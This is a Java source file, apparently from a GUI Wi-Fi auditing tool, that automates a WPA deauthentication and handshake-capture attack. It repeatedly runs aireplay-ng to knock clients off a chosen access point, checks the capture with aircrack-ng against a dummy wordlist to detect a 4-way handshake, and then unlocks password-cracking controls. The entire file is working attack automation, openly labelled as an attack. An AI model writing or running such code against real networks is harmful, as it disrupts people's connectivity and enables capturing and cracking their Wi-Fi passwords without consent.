import java.io.*;
import java.util.*;

// WPA deauth attack - sign clients off of AP so as to get 4-way handshakes when they sign back on

public class scripter implements Runnable {
	Thread t;
	public static boolean flag;
	public static boolean handshake;
	
	public scripter() {
		t = new Thread(this, "WPA Handshake Listener");
		flag = false;
		handshake = false;
	}
	
	public void run() {
		String line, wificard, client;
		Process pro2 = null;
		BufferedReader in = null;
		PrintWriter w = null;
		
		// get wifi card (found in test2.java)
		wificard = (String)test2.drivers.getItemAt(test2.drivers.getSelectedIndex());
		
		// get clients (if any)
		if (test2.wpachkclients.isSelected() == true) {
			client = (String)test2.wpaclients.getItemAt(test2.wpaclients.getSelectedIndex());
			if (client.equals("[no clients found]") == true)
				client = "";
			else
				client = " -c " + client;
		} else
			client = "";
		do {
			test2.stat("Sending 3 deauths...");
			
			try {
				pro2 = Runtime.getRuntime().exec(
					"aireplay-ng -0 3 -a " + 
					test2.currentBSSID + 
					"" + client + " " + wificard); 
				pro2.waitFor();
				pro2.destroy();
			} catch(IOException e){} catch(InterruptedException e) {}
			
			test2.stat("Sent 3 deauths; waiting...");
			
			pauseTen();
			
			test2.stat("Checking for handshake...");
			try {
				// this loop throws our cap file into aircrack-ng and tries to crack it
				// using the password "blahblahblah".. aircrack will tell us if we have
				// a handshake or not by saying "Passphrase not in dictionary"
				if ( (new File("badpw.txt")).exists() == false) {
					w = new PrintWriter(new FileWriter("badpw.txt"));
					w.println("blahblahblah");
					w.flush();
				}
				
				pro2 = Runtime.getRuntime().exec("aircrack-ng -a 2 -w badpw.txt wpa-01.cap");
				pro2.waitFor();
				
				in = new BufferedReader(new InputStreamReader(pro2.getInputStream()));
			} catch (IOException e) {} catch (InterruptedException e) {
			} finally {
				w.close();
			}
			
			try {
				while ((line = in.readLine()) != null) {
					if (line.indexOf("Passphrase not in dictionary") >= 0) {
						// this code runs if we have a handshake
						flag = true;      // stop the loop
						handshake = true; // know we got a handshake
						break;
					}
				}
				in.close();
			} catch (IOException e) {}
			
			pro2.destroy();
		} while (flag == false);
		test2.stat("Cleaning up files...");
		
		test2.pro1.destroy();
		
		try {
			pro2 = Runtime.getRuntime().exec("rm -rf badpw.txt");
			pro2.waitFor();
		} catch (IOException e) {} catch (InterruptedException ex) {}
		
		pro2.destroy();
		
		if (handshake == true) {
			// yay!
			test2.stat("Handshake was captured! Saved as wpa-01.cap");
			test2.wpacrack.setEnabled(true);
			test2.wpawordlist.setEnabled(true);
			// copy the cap file for safe keeping (let user know)
			// file is: wpa-01.cap
			
		} else {
			test2.stat(""); // say "inactive"
			// no handshake? must've hit cancel.. 
			// delete that shit! (aka cap file)
			try {
				pro2 = Runtime.getRuntime().exec("rm -rf wpa-01.cap");
				pro2.waitFor();
				pro2.destroy();
			} catch (IOException ioe) {} catch (InterruptedException ie) {}
		}
		test2.wpadeauth.setLabel("Start Deauth + Handshake Capture Attack");
		test2.setEnable(true);
	}
	public static void pauseTen() {
		int waitime;
		try {
			waitime = Integer.parseInt(test2.wpatimeout.getText());
		} catch (NumberFormatException e) {
			waitime = 5;
			test2.wpatimeout.setText("5");
		}
		
		if (waitime <= 0)
			waitime = 1;
		try { 
			for (int i = 0; i < waitime; i++) {
				test2.stat("Sent 3 deauths; waiting for " + (waitime - i) + " seconds...");
				if (flag == true)
					break;
				Thread.currentThread().sleep((int)(1000));
			}
		} catch (InterruptedException e) {}
	}
}